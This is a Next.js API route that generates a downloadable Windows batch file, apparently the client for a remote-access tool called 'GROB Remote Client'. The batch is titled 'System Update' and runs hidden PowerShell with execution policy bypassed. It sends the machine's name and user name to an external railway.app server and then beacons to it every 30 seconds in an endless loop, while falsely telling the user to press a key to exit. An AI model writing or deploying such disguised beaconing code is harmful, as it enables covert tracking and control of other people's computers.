import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const userUid = formData.get("userUid") as string
    const fileName = formData.get("fileName") as string || "grob-client"

    if (!userUid) {
      return NextResponse.json({ error: "UID required" }, { status: 400 })
    }

    // Create TURBO batch file - maximum compatibility
    const batchContent = `@echo off
setlocal enabledelayedexpansion
title System Update
color 0A
echo ====================================
echo     GROB Remote Client v4.0
echo ====================================
echo.
echo Computer: %COMPUTERNAME%
echo User: %USERNAME%
echo UID: ${userUid}
echo.
echo [INFO] Initializing client...
ping -n 1 127.0.0.1 > nul 2>&1
if !errorlevel! equ 0 (
    echo [SUCCESS] Network available
    echo [INFO] Connecting to server...
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { try { $body = @{uid='${userUid}'; computer_name=$env:COMPUTERNAME; username=$env:USERNAME; status='online'} | ConvertTo-Json -Compress; Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/connect' -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null; Write-Host '[SUCCESS] Connected to server!' } catch { Write-Host '[ERROR] Connection failed' } }"
    echo [INFO] Client is now running in background
    echo [INFO] Press any key to exit...
    timeout /t 30 /nobreak > nul
    goto loop
)
echo [ERROR] No network connection
echo [INFO] Client will retry connection...
:loop
ping -n 1 127.0.0.1 > nul 2>&1
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { try { $body = @{uid='${userUid}'; status='online'} | ConvertTo-Json -Compress; Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/heartbeat' -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 5 | Out-Null } catch { } }"
timeout /t 30 /nobreak > nul
goto loop`

    return new NextResponse(batchContent, {
      status: 200,
      headers: {
        "Content-Type": "text/plain",
        "Content-Disposition": `attachment; filename="${fileName}.bat"`,
      },
    })

  } catch (error: any) {
    console.error("Build error:", error)
    return NextResponse.json(
      { error: "Build failed", details: error.message },
      { status: 500 }
    )
  }
}
